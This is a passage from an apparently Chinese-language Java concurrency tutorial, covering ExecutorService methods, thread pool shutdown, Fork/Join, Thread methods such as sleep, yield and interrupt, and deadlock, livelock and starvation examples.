<h4 id="invokeAll"><a href="#invokeAll" class="headerlink" title="invokeAll"></a>invokeAll</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;T&gt; List&lt;Future&lt;T&gt;&gt; invokeAll(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks,</span><br><span class="line">                              <span class="keyword">long</span> timeout, TimeUnit unit)</span><br><span class="line">    <span class="keyword">throws</span> InterruptedException;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>提交tasks所有任务(<code>callable</code>的集合) ，同时得到所有任务的执行结果</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">List&lt;Future&lt;String&gt;&gt; futures = executorService.invokeAll(Arrays.asList(</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;3&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">));</span><br><span class="line">futures.forEach(future-&gt;&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        System.out.println(future.get());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException | ExecutionException e) &#123;</span><br><span class="line">        e.printStac=kTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h4 id="invokeAny"><a href="#invokeAny" class="headerlink" title="invokeAny"></a>invokeAny</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;T&gt; <span class="function">T <span class="title">invokeAny</span><span class="params">(Collection&lt;? extends Callable&lt;T&gt;&gt; tasks,</span></span></span><br><span class="line"><span class="function"><span class="params">                <span class="keyword">long</span> timeout, TimeUnit unit)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> InterruptedException, ExecutionException, TimeoutException</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>提交tasks所有任务，哪个任务先成功执行完毕，返回此任务执行结果，其他任务<strong>取消</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">Object invokeAny = executorService.invokeAny(Arrays.asList(</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">100</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        () -&gt; &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;3&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">));</span><br><span class="line">System.out.println(invokeAny.toString()); <span class="comment">//2</span></span><br></pre></td></tr></table></figure>

<h3 id="关闭线程池"><a href="#关闭线程池" class="headerlink" title="关闭线程池"></a>关闭线程池</h3><h4 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shutdown</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>线程池状态变为    SHUTDOWN</p>
<ul>
<li>不会接收新任务</li>
<li>但已提交的任务会执行完</li>
<li>该方法不会阻塞调用线程的执行,仅会打断空闲线程</li>
</ul>
</blockquote>
<h4 id="shutdownNow"><a href="#shutdownNow" class="headerlink" title="shutdownNow"></a><code>shutdownNow</code></h4><blockquote>
<p>线程池状态变为    STOP</p>
<ul>
<li>不会接收新任务</li>
<li>会将任务队列中的任务全部返回</li>
<li>并用 interrupt 的方式中断正在执行的任务</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">List&lt;Runnable&gt; <span class="title">shutdownNow</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ExecutorService executorService = Executors.newFixedThreadPool(<span class="number">2</span>);</span><br><span class="line">        Future&lt;String&gt; future = executorService.submit(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;111&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;finish111&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Future&lt;String&gt; future1 = executorService.submit(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;222&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;finish222&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        Future&lt;String&gt; future2 = executorService.submit(<span class="keyword">new</span> Callable&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;333&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;finish333&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;shutdown&quot;</span>);</span><br><span class="line">        executorService.shutdown();</span><br><span class="line"><span class="comment">//        List&lt;Runnable&gt; runnables = executorService.shutdownNow();</span></span><br><span class="line"><span class="comment">//        System.out.println(runnables);</span></span><br></pre></td></tr></table></figure>

<h3 id="处理线程异常"><a href="#处理线程异常" class="headerlink" title="处理线程异常"></a>处理线程异常</h3><ul>
<li>try-catch任务自身处理异常</li>
<li>使用Callable得到返回结果，会将异常信息<strong>封装在future对象中</strong></li>
</ul>
<h3 id="Fork-Join线程池"><a href="#Fork-Join线程池" class="headerlink" title="Fork/Join线程池"></a>Fork/Join线程池</h3><blockquote>
<p>jdk1.7的线程池实现</p>
<ul>
<li><p>体现分治思想，适用于能够进行 <strong>任务拆分的cpu密集运算</strong>，默认创建与cpu核心数大小的线程池</p>
</li>
<li><p>任务拆分：将一个大任务拆分成算法上相同的小任务，直至不能拆分可以直接求解</p>
<p><strong>将每个大任务的分解和合并交给不同的线程来完成，进一步提升运算效率</strong></p>
</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    ForkJoinPool pool=<span class="keyword">new</span> ForkJoinPool(<span class="number">4</span>);</span><br><span class="line">    System.out.println(pool.invoke(<span class="keyword">new</span> MyTask(<span class="number">5</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//继承RecursiveTask&lt;返回值类型&gt; 递归task</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyTask</span> <span class="keyword">extends</span> <span class="title">RecursiveTask</span>&lt;<span class="title">Integer</span>&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> n;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyTask</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.n = n;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Integer <span class="title">compute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//终止条件</span></span><br><span class="line">        <span class="keyword">if</span> (n==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        MyTask t1=<span class="keyword">new</span> MyTask(n-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//让一个线程执行此任务</span></span><br><span class="line">        <span class="comment">//拆分</span></span><br><span class="line">        t1.fork();</span><br><span class="line">        <span class="comment">//合并</span></span><br><span class="line">        <span class="keyword">int</span> result=n+t1.join();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Thread"><a href="#Thread" class="headerlink" title="Thread"></a>Thread</h2><blockquote>
<p>继承于<code>Runnable</code>接口，实现了<code>Run()</code>方法，<code>Run()</code>用于编写一些线程的操作</p>
</blockquote>
<h3 id="start与run"><a href="#start与run" class="headerlink" title="start与run"></a>start与run</h3><ul>
<li><code>start()</code> 让线程进入就绪状态(<code>runnable</code>)，当CPU时间片分配到CPU资源才会进入运行(<code>running</code>)状态</li>
<li><code>start()</code>会执行线程的相应准备工作，然后自动去执行<code>run()</code>方法的内容，这时真正的多线程工作</li>
<li>直接执行<code>run()</code>方法，会把<code>run</code>方法当成一个<code>main()</code>线程下的普通方法执行，并不会在某个线程中执行它，所以这并不是多线程工作</li>
</ul>
<blockquote>
<p><strong>直接调用run() 方法并没有启动新的线程，还是由main线程启动!!!!!!!</strong></p>
</blockquote>
<h3 id="sleep与yield"><a href="#sleep与yield" class="headerlink" title="sleep与yield"></a>sleep与yield</h3><p> <code>Thread.sleep(millisec)</code>方法会休眠当前正在执行的线程，<code>millisec</code>单位为毫秒。</p>
<ul>
<li>sleep() 放弃CPU时间片，<code>running</code>–&gt;<code>Timed Waiting</code>状态(阻塞状态)</li>
<li>睡眠结束后的线程未必会立刻得到执行，需要等待时间片分配CPU资源</li>
</ul>
<blockquote>
<p>该方法可能会有两个异常：</p>
<ul>
<li><code>IllegalArgumentException</code>:如果参数为负数</li>
<li><code>InterruptedException</code>:如果任何线程中断了当前线程，就会抛出此异常，此时线程的中断状态将被清除。</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">(<span class="keyword">long</span> millis)</span> <span class="keyword">throws</span> InterruptedException</span>;</span><br><span class="line"></span><br><span class="line">Thread.sleep(<span class="number">1000</span>);</span><br></pre></td></tr></table></figure>



<ul>
<li>yield() 让步，会让当前线程从<code>Running</code>进入<code>Runnable</code>就绪状态，然后<strong>调度其它同优先级的线程</strong></li>
<li>在下一次竞争中，若又获得CPU时间片则依旧继续运行</li>
</ul>
<blockquote>
<ul>
<li>具体实现<strong>依赖于操作系统的任务调度器</strong></li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">yield</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">Thread.yield()</span><br></pre></td></tr></table></figure>

<p><strong>应用</strong></p>
<blockquote>
<p>在没有利用cpu计算时，不要让while(true)空转浪费cpu，这时可以使用sleep/yield来转权给其他程序</p>
<p><strong>sleep适用于无需锁同步的场景</strong></p>
</blockquote>
<p><strong>与 sleep() 方法的区别</strong>：</p>
<ul>
<li><code>sleep()</code>方法给其他进程运行时不会考虑进程的优先级问题，因此会给低优先级的线程以运行的机会；<code>yield()</code>方法只会给相同优先级或者更高优先级的线程以运行的机会。</li>
<li><code>sleep()</code>方法声明会抛出<code>InterruptedException</code>异常，而<code>yield()</code>方法没有声明任何异常。</li>
<li><code>sleep()</code>方法比<code>yield()</code>方法（跟操作系统CPU调度相关）具有更好的可移植性。</li>
</ul>
<h3 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h3><blockquote>
<p><code>setPority()</code>,仅仅只是一个提示，调度器可以忽略它</p>
<p>CPU比较忙，那么优先级高的线程会获得更多的时间片；cpu闲时，优先级几乎没有作用</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">t1.setPriority(t1.MIN_PRIORITY);<span class="comment">//1</span></span><br><span class="line">t1.setPriority(t1.NORM_PRIORITY);<span class="comment">//5</span></span><br><span class="line">t1.setPriority(t1.MAX_PRIORITY);<span class="comment">//10</span></span><br></pre></td></tr></table></figure>

<h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><blockquote>
<p><code>setName()</code> 、<code>getName()</code>    </p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread(String name)  / Thread(Runnable target, String name)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t1=<span class="keyword">new</span> Thread(<span class="string">&quot;music&quot;</span>)</span><br><span class="line"></span><br><span class="line">t1.setName(<span class="string">&quot;music&quot;</span>);</span><br><span class="line"></span><br><span class="line">Thread.currentThread().setName()</span><br></pre></td></tr></table></figure>

<h3 id="stop-suspend-resume"><a href="#stop-suspend-resume" class="headerlink" title="stop/suspend/resume"></a>stop/suspend/resume</h3><blockquote>
<p><code>stop</code>停止/<code>suspend</code>暂停/<code>resume</code>恢复是<code>@deprecated</code>过时方法，在操作同步代码块时,会造成死锁</p>
<p>代替的方法 <code>interrupt</code>/<code>park</code>/<code>unpark</code></p>
</blockquote>
<p>初始的Java版本中定义了一个 <code>stop</code> 方法来终止一个线程，还定义了一个 <code>suspend</code> 方法来阻塞一个线程，直到另一个线程调用 <code>resume</code> 方法。在1.2之后就被弃用了。</p>
<p><code>stop()</code>方法天生不安全，因为它在终止一个线程时会强制中断线程的执行，不管run方法是否执行完，而且还会释放该线程持有的所有的锁对象。</p>
<p><code>suspend()</code>方法容易产生死锁，调用<code>suspend()</code>方法时，目标线程会停下来，但却仍然持有在这之前获得的锁定，此外，其他任何线程都不能访问锁定的资源，除非被”挂起”的线程恢复运行。对任何线程来说，如果它们想恢复目标线程，同时又试图使用任何一个锁定的资源，就会造成死锁。</p>
<p>要正确停止一个线程，应该使用<code>interrupt()</code>方法，在Thread类中置入一个标志位，指出线程应该活动还是挂起。若标志指出线程应该挂起，使用<code>wait()</code>命其进入等待状态。若标志指出线程应当恢复，则用一个<code>notify()</code>重新启动线程。<code>interrupt()</code>其本身并不是一个强制打断线程的方法，其仅仅会修改线程的<code>interrupt</code>标志位，然后让线程自行去读标志位，自行判断是否需要中断。</p>
<p><code>interrupt()</code>是一个“很软”的操作，也就是提醒线程应该结束了，至于如何结束，什么时候结束，以及是否需要结束，都是由线程自行处理。所以，<code>interrupt()</code>的使用，会让开发做更多的事，但这是有必要的，因为只有线程自己，才知道如何合适的结束自己。</p>
<h3 id="setDaemon守护线程"><a href="#setDaemon守护线程" class="headerlink" title="setDaemon守护线程"></a><code>setDaemon</code>守护线程</h3><blockquote>
<p><strong>守护线程</strong>是程序运行时在后台提供服务的线程，不属于程序中不可或缺的部分。</p>
<p>当所有非守护线程结束时，程序也就终止，同时会杀死所有守护线程</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DaemonThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;<span class="comment">//死循环</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;i am alive&quot;</span>);</span><br><span class="line">                Thread.sleep(<span class="number">500</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;finally block&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DaemonThread daemonThread = <span class="keyword">new</span> DaemonThread();</span><br><span class="line">daemonThread.setDaemon(<span class="keyword">true</span>); <span class="comment">//建立守护线程，守护main方法</span></span><br><span class="line">daemonThread.start();</span><br></pre></td></tr></table></figure>

<p>线程如果不设置为守护线程，是一个死循环，会一直执行，当我们把它设置为守护线程后，在主线程执行完成后，守护线程也会退出，但是需要注意的是<strong>守护线程在退出的时候并不会执行finally块中的代码，所以将释放资源等操作不要放在finally块中执行，这种操作是不安全的</strong>。</p>
<h3 id="interrupt"><a href="#interrupt" class="headerlink" title="interrupt"></a>interrupt</h3><blockquote>
<p>一个线程执行完毕后会自动结束，如果在运行过程中发生异常会提前结束</p>
</blockquote>
<h4 id="interruptedException"><a href="#interruptedException" class="headerlink" title="interruptedException"></a><code>interruptedException</code></h4><p>通过调用一个线程<code>interrupt()</code>方法来中断线程，如果线程处于<strong>阻塞、无限期等待、有限期等待</strong>状态，就会抛出<code>InterruptedException</code>，从而提前结束该线程。但是不能中断I/O阻塞和<code>synchronized</code>锁阻塞。</p>
<h4 id="不可打断模式interrupt"><a href="#不可打断模式interrupt" class="headerlink" title="不可打断模式interrupt()"></a>不可打断模式interrupt()</h4><p>如果一个线程的<code>run()</code>方法执行了一个无限循环，并且没有执行<code>sleep()</code>等会抛出<code>InterruptedException</code>的操作，那么调用线程的<code>interrupt()</code>方法就无法使线程提前结束。</p>
<p>但是调用<code>interrupt()</code>方法会设置线程中的中断标记，此时调用<code>interrupted()</code>方法会返回<code>true</code>,因此可以在循环体中使用<code>interrupted()</code>方法来判断线程是否处于中断状态，从而提前结束线程。</p>
<blockquote>
<ul>
<li><code>interrupt()</code>并不是马上停止线程，而是给线程<strong>打一个停止标记</strong>，将线程的中断状态设置为true<ul>
<li><code>stop()</code>方法也可以停止线程，<strong>线程锁住共享资源</strong>，被杀死后其他线程无法获得共享资源，<strong>其他线程永远无法获得资源</strong></li>
<li><code>stop</code>停止/<code>suspend</code>暂停/<code>resume</code>恢复是<code>@deprecated</code>过时方法，在操作同步代码块时,会造成死锁</li>
</ul>
</li>
<li>当中断<code>sleep/yield</code>时，会出现<code>InterruptedException</code>异常</li>
</ul>
</blockquote>
<h4 id="判断中断"><a href="#判断中断" class="headerlink" title="判断中断"></a>判断中断</h4><blockquote>
<ul>
<li><code>static boolean interrupted()</code>：Thread类的静态方法，用来判断当前线程中断状态，并清除中断标志。</li>
<li><code>boolean isInterrupted()</code>：实例方法，用来判断线程中断状态，不清除中断标志。</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">interrupted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> currentThread().isInterrupted(<span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isInterrupted</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> isInterrupted(<span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">boolean</span> <span class="title">isInterrupted</span><span class="params">(<span class="keyword">boolean</span> ClearInterrupted)</span></span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Thread t1 = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>)&#123;</span><br><span class="line">            <span class="comment">//判断线程是否中断，不清楚中断标志</span></span><br><span class="line">            <span class="keyword">boolean</span> interrupted = Thread.currentThread().isInterrupted();</span><br><span class="line">            <span class="comment">//清除中断标志</span></span><br><span class="line">            <span class="keyword">boolean</span> interrupted1 = Thread.interrupted();</span><br><span class="line">            <span class="keyword">if</span> (interrupted)&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">t1.start();</span><br><span class="line">Thread.sleep(<span class="number">50</span>);</span><br><span class="line"><span class="comment">//中断线程</span></span><br><span class="line">t1.interrupt();</span><br></pre></td></tr></table></figure>

<h4 id="线程池中断操作"><a href="#线程池中断操作" class="headerlink" title="线程池中断操作"></a>线程池中断操作</h4><p>调用<code>Executor</code>的<code>shutdown()</code>方法会等待线程都执行完毕之后再关闭，但是如果调用的是<code>shutdownNow()</code>方法，则相当于调用了每个线程的<code>interrupt()</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    ExecutorService executorService = Executors.newCachedThreadPool();</span><br><span class="line">    executorService.execute(() -&gt; &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">2000</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Thread run&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    executorService.shutdownNow();</span><br><span class="line">    System.out.println(<span class="string">&quot;Main run&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果只想中断<code>Executor</code>中的一个线程，可以通过使用 <code>submit()</code>方法来提交一个线程，它会返回一个<code>Future&lt;?&gt;</code>对象，通过调用该对象的<code>cancel(true)</code>方法就可以中断线程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Future&lt;?&gt; future = executorService.submit(() -&gt; &#123;</span><br><span class="line">    <span class="comment">// ..</span></span><br><span class="line">&#125;);</span><br><span class="line">future.cancel(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure>

<h2 id="多把锁"><a href="#多把锁" class="headerlink" title="多把锁"></a>多把锁</h2><blockquote>
<p>俩个不相干线程使用同一把锁会影响并发度</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BigRoom</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object studyRoom=<span class="keyword">new</span> Object();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object sleepRoom=<span class="keyword">new</span> Object();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (sleepRoom)&#123;</span><br><span class="line">            Thread.sleep(<span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">study</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        <span class="keyword">synchronized</span> (studyRoom)&#123;</span><br><span class="line">            Thread.sleep(<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="线程活跃性"><a href="#线程活跃性" class="headerlink" title="线程活跃性"></a>线程活跃性</h2><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><blockquote>
<p>俩个或以上的线程在执行过程中，需要获得多把锁，这时容易发生死锁</p>
<p><strong>这种因线程之间争夺资源而互相等待的现象，需要外力推动</strong></p>
<p>解决：尽量按照约定的顺序访问锁</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//死锁演示</span></span><br><span class="line"><span class="keyword">synchronized</span> (Product.class)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;卖家有货，等待买家交钱&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">        <span class="keyword">synchronized</span> (Money.class)&#123;</span><br><span class="line">    		System.out.println(<span class="string">&quot;卖家获得钱，交出货物&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解决</span></span><br><span class="line"><span class="keyword">synchronized</span> (Money.class)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;买家有钱，等待卖家交货&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        sleep(<span class="number">1000</span>);    <span class="comment">//睡眠，让出CPU资源</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">synchronized</span> (Product.class)&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;买家获得货物，钱交给卖家&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="定位死锁"><a href="#定位死锁" class="headerlink" title="定位死锁"></a>定位死锁</h4><ul>
<li>jconsole工具</li>
<li>jps定位进程</li>
</ul>
<h3 id="活锁"><a href="#活锁" class="headerlink" title="活锁"></a>活锁</h3><blockquote>
<p>俩个线程互相改变对方的结束条件，最后谁也无法结束</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> a=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">    <span class="keyword">while</span> (a&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread.sleep(<span class="number">200</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//a一直减</span></span><br><span class="line">        a--;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Thread(()-&gt;&#123;</span><br><span class="line">   <span class="keyword">while</span> (a&lt;<span class="number">20</span>)&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           Thread.sleep(<span class="number">200</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//a一直加</span></span><br><span class="line">       a++;</span><br><span class="line">       System.out.println(a);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure>

<h3 id="饥饿"><a href="#饥饿" class="headerlink" title="饥饿"></a>饥饿</h3><blockquote>
<p>在公平锁中，由于优先级太低，始终无法得到CPU调度执行，也不能结束，<strong>造成“饥饿”现象</strong></p>
</blockquote>
<h2 id="多线程回调"><a href="#多线程回调" class="headerlink" title="多线程回调"></a>多线程回调</h2><p>回调：指客户程序C调用服务程序S中的某个方法A，然后S又在某个时候反过来调用C中的某个方法B，对于C来说，这个B便称为回调方法</p>
<p>实例：设置一个提问者（客户程序C），一个回答者（服务程序S），而回答者需要回答提问者一个很深奥的问题时，这时需要很多时间去查找，提问者又开始做其他的事情，等回答者找到答案后，再把答案告诉提问者。</p>
<h3 id="多线程回调的使用"><a href="#多线程回调的使用" class="headerlink" title="多线程回调的使用"></a>多线程回调的使用</h3><ol>
<li>在回答者的类内部创建回调的接口</li>
